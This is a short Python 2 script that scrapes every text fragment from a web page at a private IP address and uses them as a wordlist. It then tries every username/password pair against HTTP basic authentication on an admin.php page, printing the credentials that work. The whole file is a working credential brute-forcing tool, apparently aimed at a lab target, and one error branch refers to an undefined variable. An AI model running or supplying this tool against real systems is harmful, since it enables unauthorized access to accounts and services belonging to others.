import requests
from bs4 import BeautifulSoup as bs4

scrapUrl = 'http://172.16.120.120'			# URL to scrap of all the content
bfUrl = 'http://172.16.120.120/admin.php'	# URL to brute force 

scrapResponse = requests.get(scrapUrl)
#scrapResponse = requests.post(url, data={'key':'test'})

if scrapResponse.status_code == 200:
    print '[+] Made GET request to ' + scrapUrl + ' ...'
else:
    print '[-] An error has occurred. Status Code: ', response.status_code

soup = bs4(scrapResponse.content, 'html.parser')
print '[+] Scrapping the page was successful'

dictionary = []
for tag in soup.find_all(True):
	dictionary.append(tag.text)

print '\nStarting brute force at ' + bfUrl + '\n'
for i in dictionary:
	for j in dictionary:
		bfResponse = requests.get(bfUrl, auth=(i, j))
		#bfResponse = requests.get(bfUrl, auth=HTTPBasicAuth(i, j))
		if str(bfResponse.status_code) == '200':
			print '[+] Username: ' + i + ' ~ Password: ' + j + ' [+]'
		#elif str(bfResponse.status_code) != '401':
			#print '[!] Username: ' + i + ' ~ Password: ' + j + 'Status Code: ' + str(bfResponse.status_code)

print '\n[!]Finished brute forcing!\n'
